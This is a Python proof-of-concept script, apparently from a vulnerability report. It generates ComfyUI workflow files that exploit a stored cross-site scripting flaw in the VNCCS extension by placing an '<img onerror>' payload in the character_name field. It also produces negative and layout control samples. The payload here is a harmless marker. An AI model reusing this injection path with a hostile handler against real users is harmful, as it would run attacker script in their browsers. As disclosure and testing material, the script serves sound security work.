#!/usr/bin/env python3
"""make_poc.py -- build the malicious and control ComfyUI workflow artifacts.

Input  : the upstream VNCCS workflow JSON shipped in the pinned source tree
         (poc/ComfyUI_VNCCS-2206d174/workflows/VNCCS_3.0_Step3_CharacterEmotions.json)
Output : samples/*.json  +  poc/SHA256SUMS.txt

The attacker-controlled field is the workflow artifact itself:
VNCCS_EmotionsGenerator.widgets_values[0] is the node's `widget_data` STRING widget
(nodes/character_generator.py:2834). Its JSON is parsed by readData() in
web/vnccs_character_generator.js:931 and the `character_name` member is interpolated
unescaped into an innerHTML template in renderSettings()
(web/vnccs_character_generator.js:2588-2592).

Artifact layout note (measured, not assumed)
--------------------------------------------
`widget_data` is the only widget in the node's INPUT_TYPES, and ComfyUI's own
serializer therefore writes a one-element `widgets_values` array for this node.
The upstream Step-3 file still carries a legacy two-element array because the
node's `emotion_data` input used to be a widget. That legacy layout is *not*
usable here: comfyui_frontend_package 1.53.10 runs every loaded node through
`migrateWidgetsValues()` (static/assets/settingStore-*.js), which rebuilds a slot
mask from the node definition inputs; for this node the mask has two entries
(emotion_data is forceInput, widget_data is a widget), so a two-element array is
treated as "old forceInput layout" and slot 0 is DROPPED. The samples below
therefore use the one-element array, i.e. exactly what this ComfyUI version
serializes for this node, with the payload in widgets_values[0].
`control_legacy_two_slot.json` keeps the legacy layout on purpose as a control.

Variants
  1. poc_xss_positive.json            payload in character_name, src points at a URL
                                      the server does not serve -> onerror fires
  2. poc_xss_negative_control.json    same tag/id/handler, src is a valid 1x1 data URI
                                      -> load succeeds, onerror never fires
  3. poc_control_missing_field.json   widgets_values[0] is the stringified empty
                                      object "{}" -> field absent, nothing to inject
  4. control_two_node_topology.json   upstream Step-3 topology kept (the
                                      EmotionGeneratorV2 source node is still present),
                                      same payload: syncEmotionStudioSourceData()
                                      overwrites character_name from the Emotion Studio
                                      node, so the payload never reaches the sink
  5. control_legacy_two_slot.json     single node, legacy two-element array: documents
                                      the frontend slot migration that eats slot 0
"""

from __future__ import annotations

import hashlib
import json
import pathlib
import sys

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parent
SAMPLES = ROOT / "samples"
PINNED = HERE / "ComfyUI_VNCCS-2206d174"
BASE_WORKFLOW = PINNED / "workflows" / "VNCCS_3.0_Step3_CharacterEmotions.json"

SINK_NODE = "VNCCS_EmotionsGenerator"
SOURCE_NODE = "EmotionGeneratorV2"

# one-pixel transparent GIF; the handler is byte-identical to the positive payload
ONE_PIXEL_GIF = (
    "data:image/gif;base64,"
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)
HANDLER = "document.documentElement.dataset.mbe2e='xss';void 0"

POSITIVE_NAME = (
    '<img id="mbe2e-seq064" src="missing-seq064" onerror="' + HANDLER + '">'
)
NEGATIVE_NAME = (
    '<img id="mbe2e-seq064" src="' + ONE_PIXEL_GIF + '" onerror="' + HANDLER + '">'
)


def load_base() -> dict:
    if not BASE_WORKFLOW.exists():
        sys.exit("missing base workflow: %s" % BASE_WORKFLOW)
    return json.loads(BASE_WORKFLOW.read_text(encoding="utf-8"))


def sink_node(wf: dict) -> dict:
    for node in wf["nodes"]:
        if node.get("type") == SINK_NODE:
            return node
    sys.exit("base workflow has no %s node" % SINK_NODE)


def strip_source_node(wf: dict) -> dict:
    """Drop the Emotion Studio source node and its links; null the sink's inputs."""
    keep, dropped_ids = [], set()
    for node in wf["nodes"]:
        if node.get("type") == SOURCE_NODE:
            dropped_ids.add(node["id"])
        else:
            keep.append(node)
    wf["nodes"] = keep
    wf["links"] = [l for l in wf["links"] if l[1] not in dropped_ids and l[3] not in dropped_ids]
    for node in wf["nodes"]:
        for slot in node.get("inputs") or []:
            if slot.get("link") is not None and not any(
                l[0] == slot["link"] for l in wf["links"]
            ):
                slot["link"] = None
    return wf


def widget_payload(wf: dict) -> str:
    """The JSON string this node's `widget_data` widget carries."""
    node = sink_node(wf)
    values = node.get("widgets_values") or [""]
    # legacy two-element arrays: slot 0 is the widget_data JSON
    raw = values[0] if values and values[0] else "{}"
    return raw


def with_character_name(wf: dict, name: str, *, slots: int = 1) -> dict:
    node = sink_node(wf)
    data = json.loads(widget_payload(wf))
    data["character_name"] = name
    values = [json.dumps(data, ensure_ascii=False)]
    if slots == 2:  # legacy layout, kept only for the control sample
        values.append("")
    node["widgets_values"] = values
    return wf


def with_raw_widget_data(wf: dict, raw: str, *, slots: int = 1) -> dict:
    values = [raw]
    if slots == 2:
        values.append("")
    sink_node(wf)["widgets_values"] = values
    return wf


def dump(name: str, wf: dict) -> pathlib.Path:
    path = SAMPLES / name
    path.write_text(
        json.dumps(wf, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    return path


def main() -> int:
    SAMPLES.mkdir(parents=True, exist_ok=True)
    written = []

    # 1. positive
    wf = with_character_name(strip_source_node(load_base()), POSITIVE_NAME)
    written.append(dump("poc_xss_positive.json", wf))

    # 2. negative control: same id + same handler, valid image source
    wf = with_character_name(strip_source_node(load_base()), NEGATIVE_NAME)
    written.append(dump("poc_xss_negative_control.json", wf))

    # 3. missing-field control: widgets_values[0] is the stringified empty object
    wf = with_raw_widget_data(strip_source_node(load_base()), "{}")
    written.append(dump("poc_control_missing_field.json", wf))

    # 4. upstream two-node topology, same payload (documents the overwrite precondition)
    wf = with_character_name(load_base(), POSITIVE_NAME)
    written.append(dump("control_two_node_topology.json", wf))

    # 5. legacy two-element widgets_values (documents the frontend slot migration)
    wf = with_character_name(strip_source_node(load_base()), POSITIVE_NAME, slots=2)
    written.append(dump("control_legacy_two_slot.json", wf))

    sums = []
    for path in written:
        digest = hashlib.sha256(path.read_bytes()).hexdigest()
        sums.append("%s  %s" % (digest, path.name))
        print("wrote %-34s %8d bytes" % (path.name, path.stat().st_size))
    (HERE / "SHA256SUMS.txt").write_text("\n".join(sums) + "\n", encoding="utf-8")
    print()
    print("sha256 -> poc/SHA256SUMS.txt")
    print()
    print("payload (positive) : %s" % POSITIVE_NAME)
    print("payload (negative) : %s" % NEGATIVE_NAME)
    print("missing-field ctrl : widgets_values[0] = {}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
